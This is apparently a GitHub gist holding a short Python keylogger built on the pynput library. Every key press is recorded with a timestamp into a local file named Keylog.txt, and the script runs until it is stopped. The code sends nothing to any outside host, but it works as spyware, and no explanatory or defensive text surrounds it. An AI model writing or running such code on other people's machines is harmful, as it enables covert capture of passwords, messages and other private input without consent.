#date: 2023-03-09T17:03:13Z
#url: https://api.github.com/gists/cf4f0f5eb1756554de0ded912ed1a863
#owner: https://api.github.com/users/meet-mistry

import logging
from pynput.keyboard import Key, Listener

logging.basicConfig(filename=("Keylog.txt"),
                    level=logging.DEBUG, format="%(asctime)s _%(message)s")
def on_press (key):
    logging.info (str(key))
with Listener (on_press=on_press)as listener:
    listener.join()